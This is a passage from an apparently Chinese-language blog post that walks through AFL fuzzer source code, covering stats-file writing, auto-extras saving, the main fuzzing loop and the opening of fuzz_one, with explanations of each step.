class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">write_stats_file</span><span class="params">(<span class="type">double</span> bitmap_cvg, <span class="type">double</span> stability, <span class="type">double</span> eps)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="type">double</span> last_bcvg, last_stab, last_eps;</span><br><span class="line">  <span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">rusage</span> usage;</span><br><span class="line"></span><br><span class="line">  u8* fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/fuzzer_stats&quot;</span>, out_dir);</span><br><span class="line">  s32 fd;</span><br><span class="line">  FILE* f;</span><br><span class="line"></span><br><span class="line">  fd = <span class="built_in">open</span>(fn, O_WRONLY | O_CREAT | O_TRUNC, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ck_free</span>(fn);</span><br><span class="line"></span><br><span class="line">  f = <span class="built_in">fdopen</span>(fd, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!f) <span class="built_in">PFATAL</span>(<span class="string">&quot;fdopen() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Keep last values in case we&#x27;re called from another context</span></span><br><span class="line"><span class="comment">     where exec/sec stats and such are not readily available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!bitmap_cvg &amp;&amp; !stability &amp;&amp; !eps) &#123;</span><br><span class="line">    bitmap_cvg = last_bcvg;</span><br><span class="line">    stability  = last_stab;</span><br><span class="line">    eps        = last_eps;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    last_bcvg = bitmap_cvg;</span><br><span class="line">    last_stab = stability;</span><br><span class="line">    last_eps  = eps;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(f, <span class="string">&quot;start_time        : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;last_update       : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;fuzzer_pid        : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;cycles_done       : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;execs_done        : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;execs_per_sec     : %0.02f\n&quot;</span></span><br><span class="line">             <span class="string">&quot;paths_total       : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;paths_favored     : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;paths_found       : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;paths_imported    : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;max_depth         : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;cur_path          : %u\n&quot;</span> <span class="comment">/* Must match find_start_position() */</span></span><br><span class="line">             <span class="string">&quot;pending_favs      : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;pending_total     : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;variable_paths    : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;stability         : %0.02f%%\n&quot;</span></span><br><span class="line">             <span class="string">&quot;bitmap_cvg        : %0.02f%%\n&quot;</span></span><br><span class="line">             <span class="string">&quot;unique_crashes    : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;unique_hangs      : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;last_path         : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;last_crash        : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;last_hang         : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;execs_since_crash : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;exec_timeout      : %u\n&quot;</span> <span class="comment">/* Must match find_timeout() */</span></span><br><span class="line">             <span class="string">&quot;afl_banner        : %s\n&quot;</span></span><br><span class="line">             <span class="string">&quot;afl_version       : &quot;</span> VERSION <span class="string">&quot;\n&quot;</span></span><br><span class="line">             <span class="string">&quot;target_mode       : %s%s%s%s%s%s%s\n&quot;</span></span><br><span class="line">             <span class="string">&quot;command_line      : %s\n&quot;</span></span><br><span class="line">             <span class="string">&quot;slowest_exec_ms   : %llu\n&quot;</span>,</span><br><span class="line">             start_time / <span class="number">1000</span>, <span class="built_in">get_cur_time</span>() / <span class="number">1000</span>, <span class="built_in">getpid</span>(),</span><br><span class="line">             queue_cycle ? (queue_cycle - <span class="number">1</span>) : <span class="number">0</span>, total_execs, eps,</span><br><span class="line">             queued_paths, queued_favored, queued_discovered, queued_imported,</span><br><span class="line">             max_depth, current_entry, pending_favored, pending_not_fuzzed,</span><br><span class="line">             queued_variable, stability, bitmap_cvg, unique_crashes,</span><br><span class="line">             unique_hangs, last_path_time / <span class="number">1000</span>, last_crash_time / <span class="number">1000</span>,</span><br><span class="line">             last_hang_time / <span class="number">1000</span>, total_execs - last_crash_execs,</span><br><span class="line">             exec_tmout, use_banner,</span><br><span class="line">             qemu_mode ? <span class="string">&quot;qemu &quot;</span> : <span class="string">&quot;&quot;</span>, dumb_mode ? <span class="string">&quot; dumb &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             no_forkserver ? <span class="string">&quot;no_forksrv &quot;</span> : <span class="string">&quot;&quot;</span>, crash_mode ? <span class="string">&quot;crash &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             persistent_mode ? <span class="string">&quot;persistent &quot;</span> : <span class="string">&quot;&quot;</span>, deferred_mode ? <span class="string">&quot;deferred &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             (qemu_mode || dumb_mode || no_forkserver || crash_mode ||</span><br><span class="line">              persistent_mode || deferred_mode) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;default&quot;</span>,</span><br><span class="line">             orig_cmdline, slowest_exec_ms);</span><br><span class="line">             <span class="comment">/* ignore errors */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Get rss value from the children</span></span><br><span class="line"><span class="comment">     We must have killed the forkserver process and called waitpid</span></span><br><span class="line"><span class="comment">     before calling getrusage */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getrusage</span>(RUSAGE_CHILDREN, &amp;usage)) &#123;</span><br><span class="line">      <span class="built_in">WARNF</span>(<span class="string">&quot;getrusage failed&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (usage.ru_maxrss == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(f, <span class="string">&quot;peak_rss_mb       : not available while afl is running\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line">    <span class="built_in">fprintf</span>(f, <span class="string">&quot;peak_rss_mb       : %zu\n&quot;</span>, usage.ru_maxrss &gt;&gt; <span class="number">20</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="built_in">fprintf</span>(f, <span class="string">&quot;peak_rss_mb       : %zu\n&quot;</span>, usage.ru_maxrss &gt;&gt; <span class="number">10</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^__APPLE__ */</span></span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fclose</span>(f);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>统计的信息：</strong> </p><p>时间相关：</p><ul><li><p><code>start_time</code>: 开始时间（Unix时间戳）</p></li><li><p><code>last_update</code>: 最后更新时间</p></li><li><p><code>exec_timeout</code>: 执行超时设置</p></li></ul><p>执行统计：</p><ul><li><p><code>execs_done</code>: 总执行次数</p></li><li><p><code>execs_per_sec</code>: 每秒执行数</p></li><li><p><code>cycles_done</code>: 完成的队列循环数</p></li></ul><p>路径发现：</p><ul><li><p><code>paths_total</code>: 队列中总路径数</p></li><li><p><code>paths_favored</code>: 优选路径数</p></li><li><p><code>paths_found</code>: 本地发现的路径</p></li><li><p><code>paths_imported</code>: 从其他实例导入的路径</p></li></ul><p>覆盖率与稳定性：</p><ul><li><p><code>bitmap_cvg</code>: 位图覆盖率</p></li><li><p><code>stability</code>: 执行稳定性</p></li><li><p><code>variable_paths</code>: 表现不稳定的测试案例数</p></li></ul><p>崩溃与挂起：</p><ul><li><p><code>unique_crashes</code>: 唯一崩溃数</p></li><li><p><code>unique_hangs</code>: 唯一挂起数</p></li><li><p><code>last_crash</code>&#x2F;<code>last_hang</code>: 最后崩溃&#x2F;挂起时间</p></li></ul><h2 id="save-auto"><a href="#save-auto" class="headerlink" title="save_auto"></a>save_auto</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">save_auto</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!auto_changed) <span class="keyword">return</span>;</span><br><span class="line">  auto_changed = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">MIN</span>(USE_AUTO_EXTRAS, a_extras_cnt); i++) &#123;</span><br><span class="line"></span><br><span class="line">    u8* fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/queue/.state/auto_extras/auto_%06u&quot;</span>, out_dir, i);</span><br><span class="line">    s32 fd;</span><br><span class="line"></span><br><span class="line">    fd = <span class="built_in">open</span>(fn, O_WRONLY | O_CREAT | O_TRUNC, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ck_write</span>(fd, a_extras[i].data, a_extras[i].len, fn);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="built_in">ck_free</span>(fn);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只保存前<code>MIN(USE_AUTO_EXTRAS, a_extras_cnt)</code>个<code>auto extras</code></p><p>Auto extras 是 AFL 在模糊测试过程中自动发现的有价值的字节序列，这些序列：</p><ul><li><p>在测试用例中频繁出现</p></li><li><p>可能触发程序的不同执行路径</p></li><li><p>用于后续的变异操作中，提高发现新路径的效率</p></li></ul><h2 id="部分main函数"><a href="#部分main函数" class="headerlink" title="部分main函数"></a>部分main函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Woop woop woop */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!not_on_tty) &#123;</span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">4</span>);</span><br><span class="line">    start_time += <span class="number">4000</span>;</span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    u8 skipped_fuzz;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cull_queue</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!queue_cur) &#123;</span><br><span class="line"></span><br><span class="line">      queue_cycle++;</span><br><span class="line">      current_entry     = <span class="number">0</span>;</span><br><span class="line">      cur_skipped_paths = <span class="number">0</span>;</span><br><span class="line">      queue_cur         = queue;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (seek_to) &#123;</span><br><span class="line">        current_entry++;</span><br><span class="line">        seek_to--;</span><br><span class="line">        queue_cur = queue_cur-&gt;next;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (not_on_tty) &#123;</span><br><span class="line">        <span class="built_in">ACTF</span>(<span class="string">&quot;Entering queue cycle %llu.&quot;</span>, queue_cycle);</span><br><span class="line">        <span class="built_in">fflush</span>(stdout);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we had a full queue cycle with no new finds, try</span></span><br><span class="line"><span class="comment">         recombination strategies next. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (queued_paths == prev_queued) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (use_splicing) cycles_wo_finds++; <span class="keyword">else</span> use_splicing = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> cycles_wo_finds = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      prev_queued = queued_paths;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="number">1</span> &amp;&amp; <span class="built_in">getenv</span>(<span class="string">&quot;AFL_IMPORT_FIRST&quot;</span>))</span><br><span class="line">        <span class="built_in">sync_fuzzers</span>(use_argv);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    skipped_fuzz = <span class="built_in">fuzz_one</span>(use_argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))</span><br><span class="line">        <span class="built_in">sync_fuzzers</span>(use_argv);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; exit_1) stop_soon = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    queue_cur = queue_cur-&gt;next;</span><br><span class="line">    current_entry++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cur) <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we stopped programmatically, we kill the forkserver and the current runner. </span></span><br><span class="line"><span class="comment">     If we stopped manually, this is done by the signal handler. */</span></span><br><span class="line">  <span class="keyword">if</span> (stop_soon == <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(child_pid, SIGKILL);</span><br><span class="line">      <span class="keyword">if</span> (forksrv_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(forksrv_pid, SIGKILL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* Now that we&#x27;ve killed the forkserver, we wait for it to be able to get rusage stats. */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">waitpid</span>(forksrv_pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">WARNF</span>(<span class="string">&quot;error waitpid\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write_bitmap</span>();</span><br><span class="line">  <span class="built_in">write_stats_file</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">save_auto</span>();</span><br><span class="line"></span><br><span class="line">stop_fuzzing:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">SAYF</span>(CURSOR_SHOW cLRD <span class="string">&quot;\n\n+++ Testing aborted %s +++\n&quot;</span> cRST,</span><br><span class="line">       stop_soon == <span class="number">2</span> ? <span class="string">&quot;programmatically&quot;</span> : <span class="string">&quot;by user&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Running for more than 30 minutes but still doing first cycle? */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cycle == <span class="number">1</span> &amp;&amp; <span class="built_in">get_cur_time</span>() - start_time &gt; <span class="number">30</span> * <span class="number">60</span> * <span class="number">1000</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cYEL <span class="string">&quot;[!] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;Stopped during the first cycle, results may be incomplete.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    (For info on resuming, see %s/README.)\n&quot;</span>, doc_path);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cull_queue</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!queue_cur) &#123;</span><br><span class="line">  queue_cycle++;</span><br><span class="line">  current_entry = <span class="number">0</span>;</span><br><span class="line">  cur_skipped_paths = <span class="number">0</span>;</span><br><span class="line">  queue_cur = queue;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> (seek_to) &#123;</span><br><span class="line">    current_entry++;</span><br><span class="line">    seek_to--;</span><br><span class="line">    queue_cur = queue_cur-&gt;next;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>首先调用<code>cull_queue</code>函数找出最优样例集合，当queue_cur为空时，表示完成了一轮队列遍历</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (queued_paths == prev_queued) &#123;</span><br><span class="line">  <span class="keyword">if</span> (use_splicing) cycles_wo_finds++; <span class="keyword">else</span> use_splicing = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> cycles_wo_finds = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">prev_queued = queued_paths;</span><br></pre></td></tr></table></figure><p>如果完整一轮队列循环后没有发现新路径（queued_paths &#x3D;&#x3D; prev_queued）：</p><ul><li>启用拼接（splicing）策略：将不同测试用例的片段组合</li><li>增加无发现循环计数器</li></ul><p>如果有新发现，重置无发现计数器</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="number">1</span> &amp;&amp; <span class="built_in">getenv</span>(<span class="string">&quot;AFL_IMPORT_FIRST&quot;</span>))</span><br><span class="line">  <span class="built_in">sync_fuzzers</span>(use_argv);</span><br></pre></td></tr></table></figure><p>如果设置了<code>AFL_IMPORT_FIRST</code>且是首次循环，则与其他fuzzer实例同步</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skipped_fuzz = <span class="built_in">fuzz_one</span>(use_argv);</span><br></pre></td></tr></table></figure><p>fuzz_one函数是AFL的核心，对当前队列条目执行各种变异策略：</p><ul><li><p>位翻转（bit flips）</p></li><li><p>字节翻转（byte flips）</p></li><li><p>算术运算（arithmetic）</p></li><li><p>已知有趣值（known integers）</p></li><li><p>字典攻击（dictionary）</p></li><li><p>随机破坏（havoc）</p></li><li><p>拼接（splicing）</p></li></ul><p>这是核心函数，之后分析</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))</span><br><span class="line">    <span class="built_in">sync_fuzzers</span>(use_argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在多实例模式下，才会进行同步</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">queue_cur = queue_cur-&gt;next;</span><br><span class="line">current_entry++;</span><br></pre></td></tr></table></figure><p>移动到下一个队列</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (stop_soon == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(child_pid, SIGKILL);</span><br><span class="line">    <span class="keyword">if</span> (forksrv_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(forksrv_pid, SIGKILL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">waitpid</span>(forksrv_pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="built_in">WARNF</span>(<span class="string">&quot;error waitpid\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>stop_soon &#x3D;&#x3D; 2：程序化停止（非用户手动停止）</p></li><li><p>终止子进程和fork服务器进程</p></li><li><p>等待fork服务器进程结束以获取资源使用统计</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">write_bitmap</span>();</span><br><span class="line"><span class="built_in">write_stats_file</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">save_auto</span>();</span><br></pre></td></tr></table></figure><p>记录位图，状态文件和自动提取的字典</p><h2 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz_one"></a>fuzz_one</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 优先处理favored条目</span></span><br><span class="line"><span class="keyword">if</span> (pending_favored) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((queue_cur-&gt;was_fuzzed || !queue_cur-&gt;favored) &amp;&amp;</span><br><span class="line">        <span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_TO_NEW_PROB) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 概率性跳过非favored条目</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;favored &amp;&amp; queued_paths &gt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (queue_cycle &gt; <span class="number">1</span> &amp;&amp; !queue_cur-&gt;was_fuzzed) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_NFAV_NEW_PROB) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_NFAV_OLD_PROB) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将测试用例映射到内存</span></span><br><span class="line">fd = <span class="built_in">open</span>(queue_cur-&gt;fname, 